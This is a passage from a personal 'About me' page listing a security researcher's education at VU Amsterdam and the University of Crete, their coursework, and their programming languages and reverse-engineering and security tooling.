vusec postgraduate scholarship vu fellowship programme (vufp) followed the computer systems security track noteworthy attended courses: computer and network security binary and malware analysis hardware security advanced operating systems software containerization 2019 | b.sc. in computer science 9.45/10.0 | university of crete (greece) thesis: the million dollar handshake: secure and attested communications in the cloud @ discs lab - forth-ics undergraduate scholarship stelios orfanoudakis noteworthy attended courses: embedded systems lab parallel programming principles of distributed computing skills languages: c, c++, x86_64 and aarch64 assembly, java, kotlin, smali, python\ntooling: android stuff (apps, custom native tools, kernel modules, etc.), frida scripting, gdb scripting, ghidra scripting, ida, jeb, pwntools, angr, intel pin, burp suite, wireshark, docker, qemu, git\n","title":"About me"}]}